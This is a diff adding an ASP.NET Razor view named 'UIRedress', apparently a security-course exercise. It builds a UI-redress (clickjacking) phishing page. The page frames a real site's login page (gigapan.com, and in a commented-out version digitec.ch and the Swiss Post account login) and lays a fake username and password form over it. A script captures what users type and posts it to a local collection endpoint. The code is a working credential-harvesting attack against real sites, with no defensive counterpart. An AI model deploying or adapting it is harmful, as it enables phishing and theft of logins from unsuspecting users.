@@ -1,0 +1,95 @@
+﻿@{
+	Layout = null;
+	ViewBag.Title = "UIRedress";
+}
+
+<!DOCTYPE html>
+<html class="html">
+	<head>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<title>M183_Tsarov - @ViewBag.Title</title>
+		<link href="~/Content/Site.css" rel="stylesheet" type="text/css" />
+	</head>
+	<body class="body">
+		<iframe src="http://gigapan.com/session/new" class="iframe" scrolling="no"></iframe>
+
+
+		<form method="post" accept-charset="utf-8" action="" class="iframeform">
+			<input name="username" type="text" class="iframeusername" />
+			<input name="password" type="password" class="iframepassword" />
+			<input name="submit" type="submit" value="" class="iframebtn" />
+		</form>
+
+		<script type="text/javascript">
+			document.getElementsByClassName("iframeform")[0].addEventListener("submit", function (e) {
+				e.preventDefault();
+				e.stopPropagation();
+				var username = document.getElementsByClassName("iframeusername")[0].value;
+				var password = document.getElementsByClassName("iframepassword")[0].value;
+				console.log("Username: " + username + " Password: " + password);
+				var xhr = new XMLHttpRequest();
+				xhr.open('POST', 'http://localhost:' + window.location.port + '/Home/FakeloginPOST');
+				xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+				xhr.send('username=' + username + '&password=' + password)
+			});
+		</script>
+	</body>
+</html>
+
+
+
+
+
+@*<!doctype html>
+<html>
+<head>
+	@*<style>
+			body {
+				width: 100%;
+				height: 100%;
+				padding: 0px;
+				margin: 0px;
+			}
+
+			.iframe {
+				width: 100%;
+				height: 100%;
+				padding: 0px;
+				margin: 0px;
+				position: absolute;
+				border: none;
+			}
+
+			#myform {
+				position: absolute;
+				top: 0;
+				right: 300px;
+			}
+		</style>
+</head>
+<body>
+	<iframe src="https://digitec.ch" class="iframe" />
+	<iframe src="https://account.post.ch/idp/?login&app=portal-delivery&service=klp&targetURL=https%3a%2f%2fwww.post.ch%2fde%2fkundencenter&abortURL=https%3a%2f%2fwww.post.ch%2fde&lang=de" class="iframe" />
+
+	<form method="post" accept-charset="utf-8" action="" id="myform">
+			<input name="username" type="text" id="username" />
+			<input name="password" type="password" id="password" />
+			<input name="submit" type="submit" value="Log in" />
+		</form>
+
+		<script type="text/javascript">
+			document.getElementById("myform").addEventListener("submit", function (e) {
+				e.preventDefault();
+				e.stopPropagation();
+				var username = document.getElementById("username").value;
+				var password = document.getElementById("password").value;
+				console.log("Username: " + username + " Password: " + password);
+				var xhr = new XMLHttpRequest();
+				xhr.open('POST', 'http://localhost:' + window.location.port + '/API/CollectUsernamePassword');
+				xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+				xhr.send('username=' + username + '&password=' + password)
+			});
+		</script>
+</body>
+</html>*@
